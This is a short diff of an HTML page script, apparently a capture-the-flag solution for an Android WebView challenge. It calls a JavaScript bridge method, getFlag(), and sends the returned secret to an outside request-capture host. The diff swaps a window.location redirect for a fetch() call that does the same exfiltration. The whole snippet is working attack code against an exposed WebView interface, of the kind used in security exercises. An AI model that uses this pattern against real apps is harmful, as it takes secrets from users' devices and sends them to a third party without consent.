@@ -10,7 +10,15 @@
             var flag = jsBridge.getFlag();  // This calls the getFlag() method in your WebView interface
 
             // Display the result in an alert
-            window.location = "https://gfynf30y.requestrepo.com/" + flag
+            fetch( "https://gfynf30y.requestrepo.com/" + flag)
+      .then(response => response.text())
+      .then(data => {
+        console.log("Fetched content:");
+        console.log(data);
+      })
+      .catch(error => {
+        console.error("Error fetching:", error);
+      });
         }
     </script>
 </head>
